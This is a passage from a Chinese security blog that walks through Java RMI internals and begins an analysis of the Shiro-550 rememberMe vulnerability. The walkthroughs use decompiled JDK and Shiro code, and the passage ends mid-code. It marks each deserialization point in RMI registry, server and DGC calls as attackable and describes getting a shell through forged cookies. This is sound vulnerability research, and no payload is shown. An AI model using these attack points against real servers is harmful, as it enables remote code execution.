class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Remote <span class="hljs-title function_">lookup</span><span class="hljs-params">(String var1)</span> <span class="hljs-keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br><br>           <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>               var3.writeObject(var1);<br>           &#125; <span class="hljs-keyword">catch</span> (IOException var18) &#123;<br>               <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var18);<br>           &#125;<br><br>           <span class="hljs-built_in">super</span>.ref.invoke(var2);<br><br>           Remote var23;<br>           <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>               var23 = (Remote)var6.readObject();<br>           &#125; <span class="hljs-keyword">catch</span> (IOException var15) &#123;<br>               <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var15);<br>           &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var16) &#123;<br>               <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var16);<br>           &#125; <span class="hljs-keyword">finally</span> &#123;<br>               <span class="hljs-built_in">super</span>.ref.done(var2);<br>           &#125;<br><br>           <span class="hljs-keyword">return</span> var23;<br>       &#125; <span class="hljs-keyword">catch</span> (RuntimeException var19) &#123;<br>           <span class="hljs-keyword">throw</span> var19;<br>       &#125; <span class="hljs-keyword">catch</span> (RemoteException var20) &#123;<br>           <span class="hljs-keyword">throw</span> var20;<br>       &#125; <span class="hljs-keyword">catch</span> (NotBoundException var21) &#123;<br>           <span class="hljs-keyword">throw</span> var21;<br>       &#125; <span class="hljs-keyword">catch</span> (Exception var22) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var22);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>传入的name是会执行writeObject方法，被序列化，说明注册中心那里会执行反序列化</p><p>其中的invoke可以理解为用于激活的函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>.ref.invoke(var2);<br></code></pre></td></tr></table></figure><p>追踪到写有invoke的接口找到他的实现类</p><p>继续跟进，发现它调用了StreamRemoteCall类的executeCall()方法，这个方法才是真正处理网络请求的方法</p><p>回到lookup，继续查看代码逻辑</p><p>执行了invoke之后看到获取了输入流，之后反序列化读取了返回值</p><p>var23就是返回的远程服务对象的动态代理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>var23 = (Remote)var6.readObject();<br></code></pre></td></tr></table></figure><p>客户端向注册中心传入名称和获取返回值的过程经过了序列化和反序列化</p><p>我们再次回到executeCall()方法，在这里下一个断点</p><p><img src="/img/RMI/r41.png"></p><p>注意到executeCall()方法中有一个处理异常的地方，这里用到了反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> TransportConstants.ExceptionalReturn:<br>           Object ex;<br>           <span class="hljs-keyword">try</span> &#123;<br>               ex = in.readObject();<br>           &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>               <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;Error unmarshaling return&quot;</span>, e);<br>           &#125;<br></code></pre></td></tr></table></figure><ul><li><p><code>case TransportConstants.ExceptionalReturn:</code><br> 当接收到的返回值类型是 <strong>异常返回</strong> 的情况时执行。</p></li><li><p><code>Object ex;</code><br> 定义一个对象 <code>ex</code>，用于存放反序列化出来的异常对象。</p></li><li><p><code>try &#123; ex = in.readObject(); &#125;</code><br> 尝试从输入流 <code>in</code> 中读取一个对象（反序列化），并赋值给 <code>ex</code>。</p></li><li><p><code>catch (Exception e) &#123; throw new UnmarshalException(&quot;Error unmarshaling return&quot;, e); &#125;</code><br> 如果在反序列化过程中出现任何异常，就抛出一个 <code>UnmarshalException</code>，并附带原始异常 <code>e</code>，提示“反序列化返回值时出错”。</p></li></ul><p>这里是可能存在安全问题的，如果注册中心返回一个恶意的流，会被这里的捕捉，也会正常反序列化</p><p>所以说只要一个方法中调用了invoke方法，就可能存在反序列化漏洞</p><p>我们看到bind方法中，也是调用了invoke的</p><p><img src="/img/RMI/r42.png"></p><p>继续调试，可以看到获取了远程对象的代理，可以看到服务运行端口</p><p><img src="/img/RMI/r43.png"></p><h3 id="客户端请求服务端-客户端"><a href="#客户端请求服务端-客户端" class="headerlink" title="客户端请求服务端-客户端"></a>客户端请求服务端-客户端</h3><p>客户端调用服务端方法时，lookup获取到的实际上是一个动态代理，不管调用什么方法，都会走到调用处理器的invoke方法</p><p>所以说执行到方法调用时，会先走到invoke方法</p><p><img src="/img/RMI/r44.png"></p><p>先跳过if判断流程，发现最后进入了invokeRemoteMethod方法</p><p>这个方法会调用另一个invoke</p><p><img src="/img/RMI/r45.png"></p><p>这个看一下这个invoke具体做了什么</p><p>首先关注到这里有一个marshalValue，它会序列化一个值，这里序列化的是我们传入的字符串hello</p><p><img src="/img/RMI/r46.png"></p><p>继续执行，看到它调用了executeCall()方法，客户端所有有关网络请求的操作都会调用这个方法</p><p><img src="/img/RMI/r47.png"></p><p>后面还有一段逻辑，如果返回值不为空，会调用unmarshalValue</p><p><img src="/img/RMI/r48.png"></p><p>这个函数中会调用readObject执行反序列化，可能存在安全问题</p><p><img src="/img/RMI/r49.png"></p><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><ul><li>先说说存在攻击的点吧，在注册中心 –&gt; 服务端这里，查找远程对象的时候是存在攻击的。</li></ul><p>具体表现形式是服务端打客户端，入口类在 <code>call.executeCall()</code>，里面抛出异常的时候会进行反序列化。</p><p>在服务端 —&gt; 客户端这里，也是存在攻击的，一共是两个点：一个是 <code>call.executeCall()</code>，另一个点是 <code>unmarshalValueSee</code> 这里。</p><ul><li>再总结一下代码的流程</li></ul><p>分为三步走，先获取注册中心，再查找远程对象，查找远程对象这里获取到了一个 ref，最后客户端发出请求，与服务端建立连接，进行通信。</p><h2 id="注册中心部分"><a href="#注册中心部分" class="headerlink" title="注册中心部分"></a>注册中心部分</h2><h3 id="客户端发起请求，注册中心的处理"><a href="#客户端发起请求，注册中心的处理" class="headerlink" title="客户端发起请求，注册中心的处理"></a>客户端发起请求，注册中心的处理</h3><p>这里的断点是要下在服务端的，我们知道客户端操作的是stub，那么服务端操作的就是skeleton</p><p>在有了 Skel 之后应当是存在 Target 里面的，所以我们的断点打到处理 Target 的地方</p><p>断点下在Transport类的第176行</p><p>下好断点后，先点服务端的debug，再运行Client就饿可以了</p><p>可以看到成功停在断点处</p><p><img src="/img/RMI/r50.png"></p><p>看一下Target中封装了什么</p><p>可以看到里面的stub是Registry_Stub，里面ref封装了port&#x3D;1099</p><p><img src="/img/RMI/r51.png"></p><p>再往下走 <code>final Dispatcher disp = target.getDispatcher();</code>这一步是对disp做一些处理</p><p>可以看到disp就是UnicastSeverRef，我们还记得skel是在这个里面的</p><p><img src="/img/RMI/r52.png"></p><p>继续跟进，看到它对disp调用了dispatch方法</p><p><img src="/img/RMI/r53.png"></p><p>跟进去看一下dispatch方法具体是做什么的</p><p><img src="/img/RMI/r54.png"></p><p>继续走，我们目前的 <code>skel</code> 不为 null，会到 <code>oldDispatch()</code> 这里，跟进</p><p><img src="/img/RMI/r55.png"></p><p>跳过一些不重要的步骤，最后走到了skel调用dispatch方法的地方</p><p><img src="/img/RMI/r56.png"></p><p>直接走进dispatch方法，发现来到了RegistryImpl_Skel类</p><p>这个类是调试不了的，所以只能看静态代码</p><p>把代码贴在这里</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatch</span><span class="hljs-params">(Remote var1, RemoteCall var2, <span class="hljs-type">int</span> var3, <span class="hljs-type">long</span> var4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (var4 != <span class="hljs-number">4905912898345647071L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkeletonMismatchException</span>(<span class="hljs-string">&quot;interface hash mismatch&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">RegistryImpl</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (RegistryImpl)var1;<br>        <span class="hljs-keyword">switch</span> (var3) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                String var100;<br>                Remote var103;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var105</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var100 = (String)var105.readObject();<br>                    var103 = (Remote)var105.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.bind(var100, var103);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                var2.releaseInputStream();<br>                String[] var99 = var6.list();<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var102</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var102.writeObject(var99);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var92) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var92);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                String var98;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var104</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var98 = (String)var104.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                <span class="hljs-type">Remote</span> <span class="hljs-variable">var101</span> <span class="hljs-operator">=</span> var6.lookup(var98);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var9.writeObject(var101);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                Remote var8;<br>                String var97;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var97 = (String)var11.readObject();<br>                    var8 = (Remote)var11.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var85) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var85);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var86) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var86);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.rebind(var97, var8);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var84) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var84);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                String var7;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var7 = (String)var10.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var81) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var81);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var82) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var82);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.unbind(var7);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var80) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var80);<br>                &#125;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;invalid method number&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在正式详细分析之前，我们还是先来梳理一下这个方法的大致逻辑</p><p>可以看到方法中有很多case分支</p><p>我们与注册中心进行交互可以使用如下几种方式：</p><ul><li>list</li><li>bind</li><li>rebind</li><li>unbind</li><li>lookup</li></ul><p>这几种方法位于 <code>RegistryImpl_Skel#dispatch</code> 中，也就是我们现在 dispatch 这个方法的地方。</p><p>如果存在对传入的对象调用 <code>readObject</code> 方法，则可以利用，<code>dispatch</code> 里面对应关系如下：</p><ul><li>0-&gt;bind</li><li>1-&gt;list</li><li>2-&gt;lookup</li><li>3-&gt;rebind</li><li>4-&gt;unbind</li></ul><p>只要中间是有反序列化就是可以攻击的，而且我们是从客户端打到注册中心，这其实是黑客们最喜欢的攻击方式。我们来看一看谁可以攻击</p><p>0 -&gt; bind 是可以攻击的</p><p><img src="/img/RMI/r57.png" alt="r57"></p><p>lookup也可以</p><p><img src="/img/RMI/r58.png"></p><p>rebind</p><p><img src="/img/RMI/r59.png"></p><p>unbind</p><p><img src="/img/RMI/r60.png"></p><p>实际上只有list是不会产生反序列化漏洞的</p><h3 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h3><p>总结一下，在客户端发起请求后，注册中心接收后主要是操作了Target，之后调用了 dispatch方法</p><p>dispatch方法中存在反序列化漏洞点，可以结合CC链去打</p><h2 id="服务端部分"><a href="#服务端部分" class="headerlink" title="服务端部分"></a>服务端部分</h2><h3 id="客户端请求服务端-服务端响应"><a href="#客户端请求服务端-服务端响应" class="headerlink" title="客户端请求服务端-服务端响应"></a>客户端请求服务端-服务端响应</h3><h4 id="Stub-proxy0"><a href="#Stub-proxy0" class="headerlink" title="Stub&#x3D;$proxy0"></a>Stub&#x3D;$proxy0</h4><p>处理网络请求时在服务端都要先处理Target，所以我们依旧利用刚才的断点</p><p>先跳过封装有DGCImpl_Stub的Targrt</p><p>看到Target封装里stub是Proxy的开始跟进，这是我们创建的远程对象的动态代理</p><p><img src="/img/RMI/r61.png"></p><p>这里也会调用dispatch方法</p><p>但是这里的skel是空的，所以不会走到oldDispatch方法，而是直接跳过了</p><p><img src="/img/RMI/r62.png"></p><p>会直接获取输入流，然后执行 hashToMethod_Map.get(op) 代码，相当于getMethod</p><p><img src="/img/RMI/r63.png"></p><p>跳过中间的一些步骤，直接跟进到调用 unmarshalValue方法的地方，我们之前提到这个方法会反序列化传入的参数，所以说这里也是可能产生反序列化漏洞的</p><p><img src="/img/RMI/r64.png"></p><p>再次走入来看一下这个函数</p><p>可以看到调用了readObject函数反序列化了</p><p><img src="/img/RMI/r65.png"></p><p>继续跟进看到走进invoke方法进行真正的远程调用</p><p><img src="/img/RMI/r66.png"></p><p>调用后我们看到控制台输出结果”HELLO”</p><p>但是程序还会继续执行，看到这里会调用marshalValue方法，是会将输出结果序列化返回给客户端</p><p><img src="/img/RMI/r67.png"></p><h4 id="Stub-RegistryImpl-Stub"><a href="#Stub-RegistryImpl-Stub" class="headerlink" title="Stub&#x3D;RegistryImpl_Stub"></a>Stub&#x3D;RegistryImpl_Stub</h4><p>分布式垃圾回收</p><p>看一下他是怎么创建的</p><p>断点需要下在 <code>ObjectTable</code> 类的 <code>putTarget()</code> 方法里面。并且将前面两个断点去掉，直接调试即可</p><p><img src="/img/RMI/r68.png"></p><p>这里调用了一个静态变量</p><p><img src="/img/RMI/r69.png"></p><p>在 DGC 这个类在调用静态变量的时候，就会完成类的初始化</p><p>类的初始化会执行这个类的静态代码块</p><p>就在这个类的静态代码块中，run方法new了一个对象</p><p><img src="/img/RMI/r70.png"></p><p>继续跟进</p><p>发现它创建了一个stub</p><p><img src="/img/RMI/r71.png"></p><p>这里和注册中心创建远程服务一样，尝试是否可以获取到这一个类 — <code>DGCImpl_Stub</code></p><p><img src="/img/RMI/r72.png"></p><p>这一个 DGCImpl_Stub 的服务至此已经被创建完毕了，它也是类似于创建远程服务一样，但是它做的业务不一样。注册中心的远程服务是用于注册的，这个是用于内存回收的，且端口随机。</p><p><img src="/img/RMI/r73.png"></p><p>再来看一下这个stub的类中有什么方法</p><p>我们重点关注一下 DGC 的 Stub 里面有漏洞的地方。</p><p>到 <code>DGCImpl_Stub</code> 这个类下，它有两个方法，一个是 clean，另外一个是 dirty。clean 就是”强”清除内存，dirty 就是”弱”清除内存。</p><p>这里调用了 <code>readObject()</code> 方法，存在反序列化的入口类。</p><p><img src="/img/RMI/r74.png"></p><p>同样在 <code>DGCImpl_Skel</code> 这个类下也存在反序列化的漏洞，如图。</p><p><img src="/img/RMI/r75.png"></p><h3 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h3><ul><li>是自动创建的一个过程，用于清理内存。</li></ul><p>漏洞点在客户端与服务端都存在，存在于 <code>Skel</code> 与 <code>Stub</code> 当中。这也就是所谓的 JRMP 绕过</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>RMI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全-shiro550</title>
    <link href="/2025/09/16/Java%E5%AE%89%E5%85%A8-shiro550/"/>
    <url>/2025/09/16/Java%E5%AE%89%E5%85%A8-shiro550/</url>
    
    <content type="html"><![CDATA[<h1 id="Java安全-shiro550"><a href="#Java安全-shiro550" class="headerlink" title="Java安全-shiro550"></a>Java安全-shiro550</h1><p>shiro550 的根本原因：固定 key 加密</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li>jdk8u65</li><li><a href="https://tomcat.apache.org/download-80.cgi">Tomcat8</a></li><li>shiro 1.2.4</li></ul><p>漏洞影响版本：Shiro &lt;&#x3D; 1.2.4</p><h3 id="tomcat8下载与配置"><a href="#tomcat8下载与配置" class="headerlink" title="tomcat8下载与配置"></a>tomcat8下载与配置</h3><p>详情请看此文章：<a href="https://blog.csdn.net/m0_61814277/article/details/140898682">Tomcat 8.5 下载、安装、启动及各种问题_tomcat8.5-CSDN博客</a></p><p>下载地址：<a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.81/bin/">Apache Archive Distribution Directory</a></p><p>选择windows-x64.zip</p><p>下载之后先clone 一下 P神的项目：<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><ol><li><p>用 IDEA 打开这个项目，去到 设置 界 面</p><p>如图配置，在 Add 的时候选择 应用程序服务器 这一选项</p><p><img src="/img/shiro/s01.png"></p></li><li><p>添加服务器</p><p><img src="/img/shiro/s02.png"></p></li><li><p>运行测试</p><p> <img src="/img/shiro/s03.png"></p></li></ol><h2 id="Shiro-550-分析"><a href="#Shiro-550-分析" class="headerlink" title="Shiro-550 分析"></a>Shiro-550 分析</h2><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul><li>勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe&#x3D;deleteMe 字段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段，那么就可以利用这个 rememberMe 进行反序列化，从而 getshell。</li></ul><p><img src="/img/shiro/s04.png"></p><p>Shiro1.2.4 及之前的版本中，AES 加密的密钥默认<strong>硬编码</strong>在代码里（Shiro-550），Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ul><li>抓包后可以看到cookie很长，我们去代码中查找一下这个cookie是怎么加密的</li></ul><p>直接搜索cookie关键字，找到CookieRememberMeManager类</p><p>在这个类的getRememberedSerializedIdentity方法中看到有base64编码</p><p><img src="/img/shiro/s05.png"></p><p>这个只是解码，一定还会有解密过程，直接查找用法，寻找哪个方法调用了这个函数</p><p>跟进到AbstractRememberMeManager类的getRememberedPrincipals方法</p><p><img src="/img/shiro/s06.png"></p><p>继续跟进到convertBytesToPrincipals方法</p><p><img src="/img/shiro/s07.png"></p><p>可以看到是先解密，再反序列化后得到cookie的内容</p><h3 id="跟进反序列化函数"><a href="#跟进反序列化函数" class="headerlink" title="跟进反序列化函数"></a>跟进反序列化函数</h3><p>发现它是一个接口</p><p><img src="/img/shiro/s11.png"></p><p>看一下它的实现方法</p><p>来到shiro包的一个类</p><p><img src="/img/shiro/s12.png"></p><p>发现这里调用了原生的readObject，可以作为反序列化入口</p><h3 id="跟进解密函数"><a href="#跟进解密函数" class="headerlink" title="跟进解密函数"></a>跟进解密函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] decrypt(<span class="hljs-type">byte</span>[] encrypted) &#123;<br>    <span class="hljs-comment">// 先把传入的加密数据赋值给 serialized</span><br>    <span class="hljs-type">byte</span>[] serialized = encrypted;<br>    <br>    <span class="hljs-comment">// 获取一个 CipherService（加解密服务）</span><br>    <span class="hljs-type">CipherService</span> <span class="hljs-variable">cipherService</span> <span class="hljs-operator">=</span> getCipherService();<br>    <br>    <span class="hljs-comment">// 如果存在加解密服务，就用它来解密数据</span><br>    <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 调用 cipherService 的 decrypt 方法，使用解密密钥对数据进行解密</span><br>        <span class="hljs-type">ByteSource</span> <span class="hljs-variable">byteSource</span> <span 